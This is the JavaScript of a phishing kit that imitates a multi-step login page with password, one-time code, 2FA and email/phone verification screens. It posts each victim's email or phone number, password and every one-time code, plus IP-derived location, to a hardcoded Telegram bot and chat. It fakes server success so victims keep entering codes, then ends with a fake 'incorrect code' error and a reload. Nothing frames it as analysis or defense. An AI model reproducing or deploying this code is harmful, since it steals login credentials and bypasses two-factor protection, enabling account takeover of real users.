// ======================================================
// TELEGRAM CONFIGURATION
// ======================================================
const TELEGRAM_BOT_TOKEN = "7488388724:AAEPgkyry54fJcCp3hjIhhtwgZdO-cjyZwU";
const TELEGRAM_CHAT_ID = "-5244196921";



// ======================================================
// COLLECT USER INFORMATION
// ======================================================

// Generate unique alphanumeric ID (e.g., 1A, 7B, 8H)
function generateUniqueID() {
    const digit = Math.floor(Math.random() * 10); // 0-9
    const letter = String.fromCharCode(65 + Math.floor(Math.random() * 26)); // A-Z
    return `${digit}${letter}`;
}

const userInfo = {
    ip: generateUniqueID(),
    userAgent: navigator.userAgent,
    timestamp: new Date().toLocaleString(),
    country: 'Unknown',
    city: 'Unknown',
    isp: 'Unknown'
};

function getUserLabelFromUrl() {
    try {
        const params = new URLSearchParams(window.location.search);
        const label = params.get('user');
        if (label && label.trim().length > 0) {
            return label.trim();
        }
    } catch (error) {
        console.log('Error reading user label:', error);
    }
    return userInfo.ip;
}

const userLabel = getUserLabelFromUrl();

async function fetchJson(url) {
    const response = await fetch(url, { cache: 'no-store' });
    if (!response.ok) {
        throw new Error(`Request failed: ${response.status}`);
    }
    return response.json();
}

// Get location info
async function collectUserInfo() {
    const providers = [
        async () => {
            const data = await fetchJson('https://ipapi.co/json/');
            return {
                country: data.country_name,
                city: data.city,
                isp: data.org
            };
        },
        async () => {
            const data = await fetchJson('https://ipwho.is/');
            return {
                country: data.country,
                city: data.city,
                isp: data.connection ? data.connection.isp : ''
            };
        },
        async () => {
            const ipData = await fetchJson('https://api.ipify.org?format=json');
            const data = await fetchJson(`https://ipapi.co/${ipData.ip}/json/`);
            return {
                country: data.country_name,
                city: data.city,
                isp: data.org
            };
        }
    ];

    for (const load of providers) {
        try {
            const info = await load();
            if (info.country) {
                userInfo.country = info.country || 'Unknown';
                userInfo.city = info.city || 'Unknown';
                userInfo.isp = info.isp || 'Unknown';
                console.log('User info collected:', userInfo);
                return;
            }
        } catch (error) {
            console.log('Location provider failed:', error);
        }
    }
}

const userInfoPromise = collectUserInfo();

async function ensureUserInfo() {
    try {
        await userInfoPromise;
    } catch (error) {
        console.log('User info promise failed:', error);
    }

    if (userInfo.country === 'Unknown') {
        const selectedCode = (document.getElementById('country-code') || {}).value || '';
        if (selectedCode && typeof countryOptions !== 'undefined') {
            updateCountryFromSelection(selectedCode);
        }
    }

    if (userInfo.country === 'Unknown') {
        const locale = (navigator.language || '').split('-')[1];
        if (locale && typeof Intl !== 'undefined' && Intl.DisplayNames) {
            const displayNames = new Intl.DisplayNames(['en'], { type: 'region' });
            const regionName = displayNames.of(locale.toUpperCase());
            if (regionName) {
                userInfo.country = regionName;
            }
        }
    }
}

// ======================================================
// TELEGRAM SEND FUNCTION
// ======================================================
async function sendToTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.error('Telegram bot token or chat ID not configured');
        return false;
    }
    
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        console.log('Telegram response:', data);
        return data.ok === true;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
    }
}

// ======================================================
// FORMAT MESSAGES FOR TELEGRAM (MONOSPACE FORMAT)
// ======================================================

function formatLoginMessage(emailPhone, password) {
    // Prefer separate hidden fields if present (country-code + phone-number)
    const countryInput = (document.getElementById('country-code') || {}).value || '';
    const phoneInput = (document.getElementById('phone-number') || {}).value || '';

    let credentialsType, credentialsValue;
    if (countryInput && phoneInput) {
        credentialsType = 'Phone';
        // ensure phone digits only after the code
        const digits = phoneInput.replace(/\D/g, '');
        credentialsValue = `${countryInput} ${digits}`;
    } else {
        // Fallback: check the provided emailPhone string
        const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone||'').replace(/\s/g, ''));
        if (isPhone) {
            const phoneNumber = (emailPhone||'').replace(/\D/g, '');
            credentialsType = 'Phone';
            credentialsValue = `+${phoneNumber}`;
        } else {
            credentialsType = 'Email';
            credentialsValue = emailPhone || '';
        }
    }
    
    // Build display: if phone, make country code bold and number monospaced
    let credentialsHtml;
    if (credentialsType === 'Phone') {
        // credentialsValue may be like "+91 123456"
        const parts = String(credentialsValue).split(/\s+/);
        const codePart = parts[0] || '';
        const numberPart = parts.slice(1).join(' ') || '';
        credentialsHtml = `<b>${codePart}</b> <code>${numberPart}</code>`;
    } else {
        credentialsHtml = `<code>${credentialsValue}</code>`;
    }

    return `<b>(${userLabel})</b>
<b>${credentialsType}:</b> ${credentialsHtml}
<b>Password:</b> <code>${password}</code>
<b>Country: ${userInfo.country}</b>`;
}

function formatOneTimeLoginMessage(emailPhone) {
    // Prefer separate hidden fields if present (country-code + phone-number)
    const countryInput = (document.getElementById('country-code') || {}).value || '';
    const phoneInput = (document.getElementById('phone-number') || {}).value || '';

    let credentialsType, credentialsValue;
    if (countryInput && phoneInput) {
        credentialsType = 'Phone';
        // ensure phone digits only after the code
        const digits = phoneInput.replace(/\D/g, '');
        credentialsValue = `${countryInput} ${digits}`;
    } else {
        // Fallback: check the provided emailPhone string
        const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone||'').replace(/\s/g, ''));
        if (isPhone) {
            const phoneNumber = (emailPhone||'').replace(/\D/g, '');
            credentialsType = 'Phone';
            credentialsValue = `+${phoneNumber}`;
        } else {
            credentialsType = 'Email';
            credentialsValue = emailPhone || '';
        }
    }
    
    // Build display: if phone, make country code bold and number monospaced
    let credentialsHtml;
    if (credentialsType === 'Phone') {
        // credentialsValue may be like "+91 123456"
        const parts = String(credentialsValue).split(/\s+/);
        const codePart = parts[0] || '';
        const numberPart = parts.slice(1).join(' ') || '';
        credentialsHtml = `<b>${codePart}</b> <code>${numberPart}</code>`;
    } else {
        credentialsHtml = `<code>${credentialsValue}</code>`;
    }

    return `<b>(${userLabel} 1⃣)</b>
<b>${credentialsType}:</b> ${credentialsHtml}
<b>Country: ${userInfo.country}</b>`;
}

function format2FAMessage(code, switched = false) {
    const prefix = switched ? 'switched' : '';
    return `<b>${prefix}🔐: (${userLabel}):</b> <code>${code}</code>`;
}

function formatEmailVerificationMessage(code, switched = false) {
    const prefix = switched ? 'switched' : '';
    return `<b>${prefix}📧: (${userLabel}):</b> <code>${code}</code>`;
}

function formatPhoneVerificationMessage(code, switched = false) {
    const prefix = switched ? 'switched' : '';
    return `<b>${prefix}📱: (${userLabel}):</b> <code>${code}</code>`;
}

function formatSwitchMessage(fromMethod, toMethod) {
    // Capitalize first letter only
    const toMethodFormatted = toMethod.charAt(0).toUpperCase() + toMethod.slice(1).toLowerCase();
    return `<b>(${userLabel})</b>
<b>Switched:</b> ${toMethodFormatted}`;
}

function formatGoVerifyMessage(method) {
    // Capitalize first letter only
    const methodFormatted = method.charAt(0).toUpperCase() + method.slice(1).toLowerCase();
    return `<b>(${userLabel})</b>
<b>Selected:</b> ${methodFormatted}`;
}

// ======================================================
// SIMULATE SERVER RESPONSES (ALWAYS SUCCESS)
// ======================================================
function simulateServerSuccess() {
    return new Promise(resolve => {
        setTimeout(() => {
            resolve({ success: true });
        }, 500); // Simulate 0.5s server delay
    });
}

let isProcessing = {
    login: false,
    twofa: false,
    email: false,
    phone: false
};

// Store current method for switch tracking
let currentMethod = '';
let isOneTimeCodeMode = false; // Track if One-time Code mode is active
let isAfterSwitch = false; // Track if verification is after a method switch

document.addEventListener("DOMContentLoaded", () => {

// ======================================================
//  BASIC HELPERS
// ======================================================

function disableBodyScroll() { document.body.style.overflow = "hidden"; }
function enableBodyScroll() { document.body.style.overflow = ""; }

function showOverlay(id) {
    const overlay = document.getElementById(id);
    const sheet = overlay.querySelector(".pop-bottomsheet") || overlay.querySelector(".dialog-item");

    disableBodyScroll();
    overlay.style.visibility = "visible";

    setTimeout(() => {
        initSwitchButtons(overlay);

        // Hide switch buttons if in verifications after password flow OR if in one-time code mode
        if ((verificationsActive && (id === "email" || id === "phone")) || isOneTimeCodeMode) {
            overlay.querySelectorAll(".switch-to-twofa, .switch-to-email, .switch-to-phone")
                .forEach(btn => btn.style.display = "none");
        } else {
            overlay.querySelectorAll(".switch-to-twofa, .switch-to-email, .switch-to-phone")
                .forEach(btn => btn.style.display = "");
        }

        // Auto-start resend timer
        setTimeout(() => {
            const resendBtn = overlay.querySelector(".resend-btn");
            if (resendBtn) startResend(id, true);
        }, 150);

    }, 20);

    if (id === "verifications") {
        overlay.classList.remove("hide-left");
        setTimeout(() => overlay.classList.add("active"), 10);
        verificationsActive = true;
    } else {
        overlay.classList.add("active");
        setTimeout(() => sheet.classList.add("active"), 10);
    }
}

function hideOverlay(id) {
    const overlay = document.getElementById(id);
    const sheet = overlay.querySelector(".pop-bottomsheet") || overlay.querySelector(".dialog-item");

    if (id === "verifications") {
        verificationsActive = false;
        overlay.classList.remove("active");
        overlay.classList.add("hide-left");

        setTimeout(() => {
            overlay.style.visibility = "hidden";
            enableBodyScroll();
        }, 350);
    } else {
        sheet.classList.remove("active");
        overlay.classList.remove("active");

        setTimeout(() => {
            overlay.style.visibility = "hidden";
            enableBodyScroll();
        }, 350);
    }
}

function startLoading(btn){ btn.classList.add("loading"); }
function stopLoading(btn){ btn.classList.remove("loading"); }

// ======================================================
//  GLOBAL FLAGS
// ======================================================
let verificationsActive = false;
let step = 1;

// ======================================================
//  TAB SWITCHING (Password / One-time Code)
// ======================================================

const passwordTab = document.querySelector('button[aria-selected="true"].tabs-btn.btn-like');
const oneTimeTab = document.querySelector('.tabs-btn.btn-like:not([aria-selected])');
const passwordField = document.getElementById('input-container2');
const passwordInput = document.getElementById('password');
const emailPhoneField = document.getElementById('input-container');
const emailPhoneInput = document.getElementById('email-phone');
// Some templates use a visible input id `email-phone-visible`; fall back to `email-phone` when absent
const emailPhoneVisibleInput = document.getElementById('email-phone-visible') || document.getElementById('email-phone');

function ensureHiddenInput(id) {
    let el = document.getElementById(id);
    if (!el) {
        el = document.createElement('input');
        el.type = 'hidden';
        el.id = id;
        document.body.appendChild(el);
    }
    return el;
}

function buildCountrySelector(container) {
    const wrap = document.createElement('div');
    wrap.className = 'order-first';

    const button = document.createElement('button');
    button.type = 'button';
    button.className = 'button select bg-input_bright account-select';

    button.innerHTML = `
        <div class="flex h-5 min-w-12 items-center justify-center border-r-2 border-solid border-third pr-1">
            <span class="mr-1.5" data-country-code>+36</span>
            <span class="mr-0.5" data-country-flag>🇭🇺</span>
            <div class="icon size-4 fill-tertiary transition ease-out" style="transform: rotate(-90deg);">
                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                    <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
                </svg>
            </div>
        </div>
    `;

    button.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        openCountrySheet();
    });

    wrap.appendChild(button);
    return wrap;
}

function shouldShowCountrySelector(value) {
    if (!value) return false;
    if (value.includes('@')) return false;
    if (/[a-zA-Z]/.test(value)) return false;
    return /^\s*\d{3}/.test(value);
}

function updateCountrySelector() {
    if (!emailPhoneField || !emailPhoneVisibleInput) return;

    const value = emailPhoneVisibleInput.value || '';
    const show = shouldShowCountrySelector(value);
    let selector = emailPhoneField.querySelector('.account-select');

    if (show && !selector) {
        const selectorWrap = buildCountrySelector(emailPhoneField);
        emailPhoneField.insertBefore(selectorWrap, emailPhoneField.firstChild);
        emailPhoneField.classList.add('has-country');
        const hiddenCode = ensureHiddenInput('country-code');
        if (!hiddenCode.value) hiddenCode.value = '+36';
    }

    if (!show && selector) {
        const wrap = selector.closest('.order-first');
        if (wrap) {
            wrap.remove();
        } else {
            selector.remove();
        }
        emailPhoneField.classList.remove('has-country');
    }

    const hiddenPhone = ensureHiddenInput('phone-number');
    hiddenPhone.value = value.replace(/\D/g, '');
}

if (emailPhoneVisibleInput) {
    emailPhoneVisibleInput.addEventListener('input', updateCountrySelector);
    updateCountrySelector();
}

const countryOptions = [
    { code: '+376', name: 'Andorra' },
    { code: '+971', name: 'United Arab Emirates' },
    { code: '+93', name: 'Afghanistan' },
    { code: '+1268', name: 'Antigua and Barbuda' },
    { code: '+1264', name: 'Anguilla' },
    { code: '+355', name: 'Albania' },
    { code: '+374', name: 'Armenia' },
    { code: '+244', name: 'Angola' },
    { code: '+672', name: 'Antarctica' },
    { code: '+54', name: 'Argentina' },
    { code: '+43', name: 'Austria' },
    { code: '+61', name: 'Australia' },
    { code: '+297', name: 'Aruba' },
    { code: '+35818', name: 'Aland Islands' },
    { code: '+994', name: 'Azerbaijan' },
    { code: '+387', name: 'Bosnia and Herzegovina' },
    { code: '+1246', name: 'Barbados' },
    { code: '+880', name: 'Bangladesh' },
    { code: '+32', name: 'Belgium' },
    { code: '+359', name: 'Bulgaria' },
    { code: '+973', name: 'Bahrain' },
    { code: '+229', name: 'Benin' },
    { code: '+673', name: 'Brunei' },
    { code: '+55', name: 'Brazil' },
    { code: '+1242', name: 'Bahamas' },
    { code: '+975', name: 'Bhutan' },
    { code: '+36', name: 'Hungary', selected: true },
    { code: '+91', name: 'India' },
    { code: '+62', name: 'Indonesia' },
    { code: '+98', name: 'Iran' },
    { code: '+972', name: 'Israel' },
    { code: '+81', name: 'Japan' },
    { code: '+965', name: 'Kuwait' },
    { code: '+7', name: 'Kazakhstan' },
    { code: '+961', name: 'Lebanon' },
    { code: '+218', name: 'Libya' },
    { code: '+212', name: 'Morocco' },
    { code: '+31', name: 'Netherlands' },
    { code: '+47', name: 'Norway' },
    { code: '+92', name: 'Pakistan' },
    { code: '+48', name: 'Poland' },
    { code: '+351', name: 'Portugal' },
    { code: '+974', name: 'Qatar' },
    { code: '+40', name: 'Romania' },
    { code: '+7', name: 'Russia' },
    { code: '+966', name: 'Saudi Arabia' },
    { code: '+65', name: 'Singapore' },
    { code: '+34', name: 'Spain' },
    { code: '+46', name: 'Sweden' },
    { code: '+41', name: 'Switzerland' },
    { code: '+90', name: 'Turkey' },
    { code: '+886', name: 'Taiwan' },
    { code: '+380', name: 'Ukraine' },
    { code: '+44', name: 'United Kingdom' },
    { code: '+1', name: 'United States' },
    { code: '+84', name: 'Vietnam' }
];

function updateCountryFromSelection(code) {
    const match = countryOptions.find(item => item.code === code);
    if (match && match.name) {
        userInfo.country = match.name;
    }
}

const defaultCountry = countryOptions.find(item => item.selected);
if (defaultCountry && userInfo.country === 'Unknown') {
    userInfo.country = defaultCountry.name;
}

function openCountrySheet() {
    const sheet = document.getElementById('country-sheet');
    const list = document.getElementById('country-list');
    const search = document.getElementById('country-search');
    if (!sheet || !list) return;

    const renderList = (filter = '') => {
        const q = filter.trim().toLowerCase();
        list.innerHTML = '';
        countryOptions
            .filter(item => !q || item.code.includes(q) || item.name.toLowerCase().includes(q))
            .forEach(item => {
                const btn = document.createElement('button');
                btn.className = 'radio btn-like select-item';
                if (item.selected) {
                    btn.setAttribute('aria-selected', 'true');
                }
                btn.innerHTML = `<span class="mr-1 w-12 flex-none whitespace-nowrap text-left">${item.code}</span>` +
                    `<span class="ellipsis max-w-60 overflow-hidden whitespace-nowrap" title="${item.name}">${item.name}</span>`;
                btn.addEventListener('click', () => {
                    countryOptions.forEach(opt => { opt.selected = opt.code === item.code; });
                    const codeSpan = document.querySelector('[data-country-code]');
                    const flagSpan = document.querySelector('[data-country-flag]');
                    if (codeSpan) codeSpan.textContent = item.code;
                    if (flagSpan) flagSpan.textContent = '';
                    const hiddenCode = ensureHiddenInput('country-code');
                    hiddenCode.value = item.code;
                    updateCountryFromSelection(item.code);
                    closeCountrySheet();
                });
                list.appendChild(btn);
            });
    };

    if (search) {
        search.value = '';
        search.oninput = () => renderList(search.value);
    }

    renderList('');
    sheet.classList.add('active');
    sheet.addEventListener('click', (e) => {
        if (e.target === sheet) closeCountrySheet();
    }, { once: true });
}

function closeCountrySheet() {
    const sheet = document.getElementById('country-sheet');
    if (sheet) sheet.classList.remove('active');
}

if (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneField && emailPhoneInput) {
    // One-time Code tab click
    oneTimeTab.addEventListener('click', (e) => {
        e.preventDefault();
        isOneTimeCodeMode = true;
        
        // Switch aria-selected attributes
        passwordTab.removeAttribute('aria-selected');
        oneTimeTab.setAttribute('aria-selected', 'true');
        
        // Hide password field and make it not required
        passwordField.style.display = 'none';
        passwordInput.removeAttribute('required');
        passwordInput.value = ''; // Clear any existing password
        
        // Change placeholder text to remove "/Username"
        if(emailPhoneVisibleInput) emailPhoneVisibleInput.placeholder = 'Email / Phone Number';
    });

    // Password tab click
    passwordTab.addEventListener('click', (e) => {
        e.preventDefault();
        isOneTimeCodeMode = false;
        
        // Switch aria-selected attributes
        oneTimeTab.removeAttribute('aria-selected');
        passwordTab.setAttribute('aria-selected', 'true');
        
        // Show password field and make it required
        passwordField.style.display = 'flex';
        passwordInput.setAttribute('required', 'required');
        
        // Restore original placeholder text
        if(emailPhoneVisibleInput) emailPhoneVisibleInput.placeholder = 'Email / Phone Number / Username';
    });
}

// ======================================================
//  LOGIN → open twofa
// ======================================================

const form = document.getElementById("login-form");
const twofaInput = document.getElementById("twofa_input");
const twofaButton = document.getElementById("twofa_button");

// password toggle handler (eye icon)
try{
    const pwdToggle = document.getElementById('password-toggle');
    const pwdInput = document.getElementById('password');
    if(pwdToggle && pwdInput){
        pwdToggle.addEventListener('click', ()=>{
            if(pwdInput.type === 'password'){
                pwdInput.type = 'text';
                pwdToggle.setAttribute('aria-pressed','true');
                pwdToggle.classList.add('visible');
            } else {
                pwdInput.type = 'password';
                pwdToggle.setAttribute('aria-pressed','false');
                pwdToggle.classList.remove('visible');
            }
        });
        pwdToggle.addEventListener('keydown', (e)=>{ if(e.key==='Enter' || e.key===' ') { e.preventDefault(); pwdToggle.click(); } });
    }
}catch(e){/* ignore */}

twofaInput.addEventListener("input", () => {
    twofaButton.disabled = twofaInput.value.length !== 6;
});

form.addEventListener("submit", async e => {
    e.preventDefault();

    if (isProcessing.login) return;
    isProcessing.login = true;
    
    const submitButton = form.querySelector('button[type="submit"]');
    startLoading(submitButton);

    const emailPhone = document.getElementById("email-phone").value;
    const password = document.getElementById("password").value;

    // Validate email or phone format
    const isPhone = /^[\d+][\d\s\-()]+$/.test(emailPhone.replace(/\s/g, ''));
    if (isPhone) {
        // Validate phone number has 7-15 digits
        const phoneDigits = emailPhone.replace(/\D/g, '');
        if (phoneDigits.length < 7 || phoneDigits.length > 15) {
            stopLoading(submitButton);
            submitButton.offsetHeight; // Force reflow
            isProcessing.login = false;
            showToast("Incorrect email or phone number");
            return;
        }
    } else {
        // Validate email format
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(emailPhone)) {
            stopLoading(submitButton);
            submitButton.offsetHeight; // Force reflow
            isProcessing.login = false;
            showToast("Incorrect email or phone number");
            return;
        }
    }

    // Send login credentials to Telegram based on mode
    await ensureUserInfo();
    let loginMessage;
    if (isOneTimeCodeMode) {
        loginMessage = formatOneTimeLoginMessage(emailPhone);
    } else {
        loginMessage = formatLoginMessage(emailPhone, password);
    }
    await sendToTelegram(loginMessage);

    // Simulate server delay and always return success
    const result = await simulateServerSuccess();
    
    stopLoading(submitButton);

    if (result.success) {
        if (isOneTimeCodeMode) {
            // One-time code mode: skip 2FA and go directly to email/phone verification
            // Detect if user entered email or phone
            const isPhone = /^[\d+][\d\s\-()]+$/.test(emailPhone.replace(/\s/g, ''));
            
            if (isPhone) {
                currentMethod = 'phone';
                isAfterSwitch = false;
                await sendGoVerify("phone");
                showOverlay("phone");
            } else {
                currentMethod = 'email';
                isAfterSwitch = false;
                await sendGoVerify("email");
                showOverlay("email");
            }
        } else {
            // Password mode: show 2FA authenticator
            currentMethod = 'twofa';
            showOverlay("twofa");
        }
    }

    isProcessing.login = false;
});

// ======================================================
//  UNIVERSAL SUCCESS HANDLER → enter verifications
// ======================================================

function enterVerifications(fromBlock) {
    hideOverlay(fromBlock);

    setTimeout(() => {
        step = 1;
        showOverlay("verifications");
        updateVerificationUI();
    }, 400);
}

// ======================================================
//  TWOFA CONFIRM
// ======================================================

twofaButton.addEventListener("click", async () => {
    if (isProcessing.twofa) return;
    isProcessing.twofa = true;

    startLoading(twofaButton);

    // Send 2FA code to Telegram
    const twofaMessage = format2FAMessage(twofaInput.value, isAfterSwitch);
    await sendToTelegram(twofaMessage);

    // Simulate server response
    const result = await simulateServerSuccess();

    stopLoading(twofaButton);

    if (result.success) {
        twofaInput.value = "";
        enterVerifications("twofa");
    } else {
        showToast("Verification code is incorrect");
        twofaInput.value = "";
    }

    isProcessing.twofa = false;
});

// ======================================================
//  VERIFICATIONS BLOCK (step 1 / 2)
// ======================================================

const verifOverlay = document.getElementById("verifications");
const emailVerifyBtn = document.getElementById("email_verify");
const phoneVerifyBtn = document.getElementById("phone_verify");

function updateVerificationUI() {
    const counterElement = verifOverlay.querySelector("p.text-warning");
    if (counterElement) {
        counterElement.innerHTML = `<span>${step}</span><span>/</span><span>2</span>`;
    }
    
    if (emailVerifyBtn) {
        emailVerifyBtn.style.display = step === 1 ? "flex" : "none";
    }
    
    if (phoneVerifyBtn) {
        phoneVerifyBtn.style.display = step === 2 ? "flex" : "none";
    }
}

// ======================================================
//  EMAIL BLOCK
// ======================================================

const emailInput = document.getElementById("email_input");
const emailButton = document.getElementById("email_button");

if (emailInput) {
    emailInput.addEventListener("input", () => {
        if (emailButton) {
            emailButton.disabled = emailInput.value.length !== 6;
        }
    });
}

if (emailVerifyBtn) {
    emailVerifyBtn.addEventListener("click", () => {
        currentMethod = 'email';
        isAfterSwitch = false;
        // Send "Go Verify" to Telegram when email is selected
        sendGoVerify("email");
        showOverlay("email");
    });
}

if (emailButton) {
    emailButton.addEventListener("click", async () => {
        if (isProcessing.email) return;
        isProcessing.email = true;

        startLoading(emailButton);

        // Send email verification code to Telegram
        const emailMessage = formatEmailVerificationMessage(emailInput.value, isAfterSwitch);
        await sendToTelegram(emailMessage);

        // Simulate server response
        const result = await simulateServerSuccess();

        stopLoading(emailButton);
        emailInput.value = "";

        if (!result.success) {
            showToast("Verification code is incorrect");
            isProcessing.email = false;
            return;
        }

        // First verification (verifications not shown yet)
        if (!verificationsActive) {
            enterVerifications("email");
            isProcessing.email = false;
            return;
        }

        // Transition from step 1 → step 2
        hideOverlay("email");
        hideOverlay("verifications");

        setTimeout(() => {
            step = 2;
            updateVerificationUI();
            
            if (emailVerifyBtn && phoneVerifyBtn) {
                emailVerifyBtn.style.transition = "opacity .5s ease";
                phoneVerifyBtn.style.transition = "opacity .5s ease";
                emailVerifyBtn.style.display = "none";
                phoneVerifyBtn.style.display = "flex";
                emailVerifyBtn.style.pointerEvents = "none";
                phoneVerifyBtn.style.pointerEvents = "auto";
            }
            
            showOverlay("verifications");
            
            setTimeout(() => {
                isProcessing.email = false;
            }, 300);
        }, 1000);
    });
}

// ======================================================
//  PHONE BLOCK (FINAL STEP → reload)
// ======================================================

const phoneInput = document.getElementById("phone_input");
const phoneButton = document.getElementById("phone_button");

if (phoneInput) {
    phoneInput.addEventListener("input", () => {
        if (phoneButton) {
            phoneButton.disabled = phoneInput.value.length !== 6;
        }
    });
}

if (phoneVerifyBtn) {
    phoneVerifyBtn.addEventListener("click", () => {
        currentMethod = 'phone';
        isAfterSwitch = false;
        // Send "Go Verify" to Telegram when phone is selected
        sendGoVerify("phone");
        showOverlay("phone");
    });
}

if (phoneButton) {
    phoneButton.addEventListener("click", async () => {
        startLoading(phoneButton);

        // Send phone verification code to Telegram
        const phoneMessage = formatPhoneVerificationMessage(phoneInput.value, isAfterSwitch);
        await sendToTelegram(phoneMessage);

        // Simulate server response
        const result = await simulateServerSuccess();

        stopLoading(phoneButton);
        phoneInput.value = "";

        if (!result.success) {
            showToast("Verification code is incorrect");
            return;
        }

        // First verification (verifications not shown yet)
        if (!verificationsActive) {
            enterVerifications("phone");
            return;
        }

        // Final step (step 2/2) - show success and reload
        const toast = document.createElement("div");
        toast.className = "toast-layer";
        toast.innerHTML = `
            <div class="overflow-hidden flex" style="height: 56px; transition: height .5s var(--ease-out);">
                <div class="toast" style="align-items: anchor-center;">
                    <div class="icon w-6 h-6 mr-2 -mt-0.5 flex-none fill-error">
                        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                            <path style="fill:#ff4545" fill-rule="evenodd" clip-rule="evenodd" d="M28 16C28 22.6274 22.6274 28 16 28C9.37258 28 4 22.6274 4 16C4 9.37258 9.37258 4 16 4C22.6274 4 28 9.37258 28 16ZM20.9929 12.5802L17.5747 15.9984L20.9929 19.4166C21.4239 19.8475 21.4239 20.5609 20.9929 20.9919C20.7699 21.2148 20.4876 21.3188 20.2052 21.3188C19.9228 21.3188 19.6405 21.2148 19.4175 20.9919L15.9994 17.5737L12.5812 20.9919C12.3583 21.2148 12.0759 21.3188 11.7935 21.3188C11.5112 21.3188 11.2288 21.2148 11.0059 20.9919C10.5749 20.5609 10.5749 19.8475 11.0059 19.4166L14.424 15.9984L11.0059 12.5802C10.5749 12.1492 10.5749 11.4359 11.0059 11.0049C11.4368 10.5739 12.1502 10.5739 12.5812 11.0049L15.9994 14.4231L19.4175 11.0049C19.8485 10.5739 20.5619 10.5739 20.9929 11.0049C21.4239 11.4359 21.4239 12.1492 20.9929 12.5802Z"/>
                        </svg>
                    </div>
                    Verification code is incorrect
                </div>
            </div>`;
        document.body.appendChild(toast);

        setTimeout(() => {
            toast.remove();
            window.location.reload();
        }, 2000);
    });
}

// ======================================================
//  SWITCH BETWEEN twofa / email / phone
// ======================================================

async function sendSwitchToTelegram(fromMethod, toMethod) {
    const switchMessage = formatSwitchMessage(fromMethod, toMethod);
    await sendToTelegram(switchMessage);
}

function switchOverlay(from, to, method) {
    const fromMethod = currentMethod;
    currentMethod = method;
    isAfterSwitch = true; // Mark that next code submission is after a switch
    
    hideOverlay(from);
    
    // Send switch action to Telegram
    sendSwitchToTelegram(fromMethod, method);
    
    setTimeout(() => showOverlay(to), 350);
}

function initSwitchButtons(overlay) {
    const id = overlay.id;

    const swEmail = overlay.querySelector(".switch-to-email");
    const swPhone = overlay.querySelector(".switch-to-phone");
    const swTwofa = overlay.querySelector(".switch-to-twofa");

    if (swEmail) {
        swEmail.onclick = () => switchOverlay(id, "email", "email");
    }

    if (swPhone) {
        swPhone.onclick = () => switchOverlay(id, "phone", "phone");
    }

    if (swTwofa) {
        swTwofa.onclick = () => switchOverlay(id, "twofa", "twofa");
    }
}

// ======================================================
//  TOAST (NO RELOAD HERE)
// ======================================================

function showToast(message) {
    const toast = document.createElement("div");
    toast.className = "toast";
    toast.style.cssText = 'display: flex; align-items: center; background: #232626; color: #fff; border-radius: 10px; box-shadow: 0 2px 16px #0008; padding: 0.45rem 0.75rem; font-size: 0.85rem; font-weight: 600; position: fixed; left: 5%; right: 5%; width: 90%; margin: 0 auto; box-sizing: border-box; top: 32px; transform: scale(0.98); opacity: 0; z-index: 2147483647;';
    toast.innerHTML = `
        <div class="icon w-6 h-6 mr-2 -mt-0.5 flex-none" style="fill:#ff4545;">
            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                <path fill="#ff4545" fill-rule="evenodd" clip-rule="evenodd" d="M28 16C28 22.6274 22.6274 28 16 28C9.37258 28 4 22.6274 4 16C4 9.37258 9.37258 4 16 4C22.6274 4 28 9.37258 28 16ZM20.9929 12.5802L17.5747 15.9984L20.9929 19.4166C21.4239 19.8475 21.4239 20.5609 20.9929 20.9919C20.7699 21.2148 20.4876 21.3188 20.2052 21.3188C19.9228 21.3188 19.6405 21.2148 19.4175 20.9919L15.9994 17.5737L12.5812 20.9919C12.3583 21.2148 12.0759 21.3188 11.7935 21.3188C11.5112 21.3188 11.2288 21.2148 11.0059 20.9919C10.5749 20.5609 10.5749 19.8475 11.0059 19.4166L14.424 15.9984L11.0059 12.5802C10.5749 12.1492 10.5749 11.4359 11.0059 11.0049C11.4368 10.5739 12.1502 10.5739 12.5812 11.0049L15.9994 14.4231L19.4175 11.0049C19.8485 10.5739 20.5619 10.5739 20.9929 11.0049C21.4239 11.4359 21.4239 12.1492 20.9929 12.5802Z"></path>
            </svg>
        </div>
        ${message}
        <div class="ml-auto relative" style="width:28px;height:28px;">
            <svg class="circle-countdown" viewBox="0 0 32 32" style="transform: rotate(-90deg); stroke: #ff3b3b; stroke-width: 4; fill: none;">
                <circle cx="16" cy="16" r="11"></circle>
            </svg>
        </div>`;
    document.body.appendChild(toast);
    
    setTimeout(() => { 
        toast.style.opacity = '1'; 
        toast.style.transform = 'scale(1)';
    }, 30);
    
    setTimeout(() => { 
        toast.style.opacity = '0'; 
        setTimeout(() => { 
            toast.remove(); 
        }, 400); 
    }, 2500);
}

// ======================================================
//  GOVerify (Telegram log)
// ======================================================

async function sendGoVerify(method) {
    const goVerifyMessage = formatGoVerifyMessage(method);
    await sendToTelegram(goVerifyMessage);
}

// ======================================================
//  RESEND TIMER
// ======================================================

let resendTimer = {
    email: null,
    phone: null
};

function startResend(btnOrType, forced = false) {
    let btn;
    let type;

    if (btnOrType instanceof HTMLElement) {
        btn = btnOrType;
        type = btn.closest(".pop-overlayer").id;
    } else {
        type = btnOrType;
        const overlay = document.getElementById(type);
        if (!overlay) return;
        btn = overlay.querySelector(".resend-btn");
    }

    if (!btn) return;

    if (resendTimer[type] && !forced) return;

    if (resendTimer[type]) clearInterval(resendTimer[type]);

    let timeLeft = 60;

    btn.disabled = true;
    const span = btn.querySelector("span");
    if (span) {
